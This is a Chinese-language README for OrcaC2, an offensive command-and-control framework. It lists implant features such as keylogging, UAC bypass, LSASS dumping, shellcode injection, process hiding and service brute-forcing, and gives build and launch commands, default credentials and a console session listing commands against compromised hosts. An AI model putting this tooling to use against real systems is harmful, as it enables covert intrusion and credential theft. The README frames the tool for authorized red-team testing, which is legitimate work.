# OrcaC2

## 简介

`OrcaC2`是一款基于Websocket加密通信的多功能C&C框架，使用Golang实现。

由三部分组成：`Orca_Server`(服务端)、`Orca_Master`(控制端)、`Orca_Puppet`(被控端)。

<p align="center">
  <img src="https://camo.githubusercontent.com/901feedaecaae6c639aa78d381759233dbfa9ccad2f67545e3471b3e41903382/68747470733a2f2f692e696d6775722e636f6d2f4f584d484a71692e6a7067" width=400 height=400 alt="ST"/>
</p>
<p align="center">
    <img src="https://img.shields.io/github/license/Ptkatz/OrcaC2">
    <img src="https://img.shields.io/github/v/release/Ptkatz/OrcaC2?color=brightgreen">
    <img src="https://img.shields.io/github/go-mod/go-version/Ptkatz/OrcaC2?filename=Orca_Master%2Fgo.mod&color=6ad7e5">
</p>
<p align="center">
    <img src="https://img.shields.io/github/stars/Ptkatz/OrcaC2?style=social">
    🐳
    <img src="https://img.shields.io/github/forks/Ptkatz/OrcaC2?style=social">
</p>






## 特性&功能

- Websocket通信，json格式传输数据，消息与数据采用AES-CBC加密+Base64编码
- 远程命令控制（增加命令备忘录功能，可以快速选择长命令）
- 文件上传/下载
- 屏幕截图（控制端为Windows系统）
- 远程屏幕控制（基于截图流，可控制键盘与鼠标）（控制端为Windows系统）
- 键盘记录
- 可查询被控端与被控主机基本信息（查询ip纯真库定位外网ip所对应的地理区域）
- 进程枚举/进程终止
- 可交互式终端（控制端为linux系统）
- 隐藏进程（在使用`ps`命令时显示进程名为进程列表中任意进程，并能够删除自身程序）（控制端为linux系统）
- 绕过UAC，获取管理员权限（控制端为Windows系统）
- CLR内存加载.Net程序集（控制端为Windows系统）
- 远程加载Powershell模块（控制端为Windows系统）
- 远程Shellcode、PE加载（支持的注入方式：CreateThread、CreateRemoteThread、RtlCreateUserThread、EtwpCreateEtwThread）（控制端为Windows系统）
- 正/反向代理、socks5正/反向代理（支持的协议：tcp、rudp(可靠udp)、ricmp(可靠icmp)、rhttp(可靠http)、kcp、quic）
- 多协程端口扫描（指纹识别端口信息）
- 多协程端口爆破（支持ftp、ssh、wmi、wmihash、smb、mssql、oracle、mysql、rdp、postgres、redis、memcached、mongodb、snmp）
- 远程ssh命令执行/文件上传/文件下载/ssh隧道
- 远程smb命令执行(无回显)/文件上传（通过rpc服务执行命令，类似wmiexec；通过ipc$上传文件，类似psexec）
- 使用MiniDumpWriteDump API 提取Lsass.dmp（控制端为Windows系统）
- CreateProcessWithPipe方式加载执行mimikatz、fscan（控制端为Windows系统）



## 安装

> 编译源码前，需要先在本地安装：go (>=1.18) 、gcc 

### Windows系统下编译

下载并解压源码包后，直接运行`install.bat`文件即可。



### Kali_Linux系统下编译

```console
$ git clone https://github.com/Ptkatz/OrcaC2.git
$ cd OrcaC2
$ chmod +x install.sh
$ ./install.sh
```



## 使用

### Orca_Server端

存在配置文件(`./conf/app.ini`)与数据库文件(`./db/team.db`、`./qqwry.dat`)的情况下双击即可运行



### Orca_Puppet端

```console
Orca_Puppet.exe -host <Server端IP:端口> -debug -hide
```

参数说明：

- -host:     连接到Server端的地址，默认为127.0.0.1:6000
- -debug:    打开调试信息，默认为false
- -hide:     在Linux系统下可以伪造进程名，并删除自身程序文件



### Orca_Master端

```console
Orca_Master.exe -u <用户名> -p <密码> -H <Server端IP:端口>
```

参数说明：

- -u | --username:     连接到Server端的用户名
- -p | --password:    连接到Server端的密码
- -H | --host:    连接到Server端的地址，默认为127.0.0.1:6000
- -c | --color: logo与命令提示符的颜色

> Server端数据库中默认的用户名和密码为 admin:123456



连接成功：

```console
C:\Users\blood\Desktop\OrcaC2\out\master>Orca_Master_win_x64.exe -u admin -p 123456
OrcaC2 Master 0.10.5
https://github.com/Ptkatz/OrcaC2
                                ,;;;;;;,
                           {;g##7    9####h;;;;,,
                         {E777777779###########F7'
                        ~`           7##########;
                        <:_           "##########h
                         -(:__          VG#3######,
                          ~-=:=:=:__     -""d#####]
                              ~--====_      {Q####]
                           {;;,   ~-<=:     l#####
                            9###.   ~==:   {Q###F'
                            g###h,  =::` {a####7
                        ;;;########gss;g####P7
                        7777777777G###7777'


                ;g77h;    lE779;    {;P79]      g#,
               l#    #]   lE;;gF    #]         gLJ#,
                7N;;F7    l# "9h    "7L;g]    gF777#,
                                                       by: Ptkatz

2022/11/04 19:29:53 [*] login success
Orca[admin] » help

OrcaC2 command line tool

Commands:
  clear            clear the screen
  exit             exit the shell
  generate, build  generate puppet
  help             use 'help [command]' for command help
  list, ls         list hosts
  port             use port scan or port brute
  powershell       manage powershell script
  proxy            activate the proxy function
  select           select the host id waiting to be operated
  ssh              connects to target host over the SSH protocol

Orca[admin] » list
+----+---------------+-----------------+------------------------------------------+-------+-----------+-------+
| ID |   HOSTNAME    |       IP        |                    OS                    | ARCH  | PRIVILEGE | PORT  |
+----+---------------+-----------------+------------------------------------------+-------+-----------+-------+
|  1 | PTKATZ/ptkatz | 10.10.10.10     | Microsoft Windows Server 2016 Datacenter | amd64 | user      | 49704 |
|  2 | kali/root     | 192.168.123.243 | Kali GNU/Linux Rolling                   | amd64 | root      | 35872 |
+----+---------------+-----------------+------------------------------------------+-------+-----------+-------+
Orca[admin] » select 1
Orca[admin] → 10.10.10.10 » help

OrcaC2 command line tool

Commands:
  assembly         manage the CLR and execute .NET assemblies
  back             back to the main menu
  clear            clear the screen
  close            close the selected remote client
  dump             extract the lsass.dmp
  exec             execute shellcode or pe in memory
  exit             exit the shell
  file             execute file upload or download
  generate, build  generate puppet
  getadmin         bypass uac to get system administrator privileges
  help             use 'help [command]' for command help
  info             get basic information of remote host
  keylogger        get information entered by the remote host through the keyboard
  list, ls         list hosts
  plugin           load plugin (mimikatz｜fscan)
  port             use port scan or port brute
  powershell       manage powershell script
  process, ps      manage remote host processes
  proxy            activate the proxy function
  screen           screenshot and screensteam
  select           select the host id waiting to be operated
  shell, sh        send command to remote host
  smb              lateral movement through the ipc$ pipe
  ssh              connects to target host over the SSH protocol

Orca[admin] → 10.10.10.10 »
```



## TODO

- [ ] 支持Websocket SSL
- [x] Dump Lsass
- [x] Powershell模块加载
- [ ] 完善Linux-memfd无文件执行
- [ ] 内网中间人攻击
- [ ] Linux系统的屏幕截图
- [ ] 基于VNC的远程桌面
- [ ] Webshell管理
- [ ] WireGuard搭建隧道接入内网
- [ ] 对MacOS系统更多支持
- [x] 根据payload生成被控端加载器
- [x] 使用C实现远程加载器加载被控端，解决被控端体积过大问题
- [ ] 多端口监听器
- [ ] ...



## 参考

https://github.com/woodylan/go-websocket

https://github.com/BishopFox/sliver

https://github.com/Ne0nd0g/merlin

https://github.com/Ne0nd0g/go-clr

https://github.com/Binject/go-donut

https://github.com/sh4hin/GoPurple

https://github.com/whitehatnote/BlueShell

https://github.com/0x9ef/golang-uacbypasser

https://github.com/esrrhs/spp

https://github.com/Amzza0x00/go-impacket

https://github.com/C-Sto/goWMIExec

https://github.com/4dogs-cn/TXPortMap

https://github.com/niudaii/crack

https://github.com/anthemtotheego/C_Shot

https://github.com/ramoncjs3/DumpLsass



**由衷感谢以上项目的作者/团队对开源的贡献与支持**



## 已知Bug

- 使用`assembly invoke`功能调用部分C#程序时会出错，在工作中务必先进行试验
- 利用smb命令执行（`smb exec`）上线时，无法使用屏幕截图与屏幕控制功能



## 免责声明

本工具仅面向***合法授权***的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。***请勿对非授权目标进行扫描。***

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，本人将不承担任何法律及连带责任。

在安装并使用本工具前，请您***务必审慎阅读、充分理解各条款内容***，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。
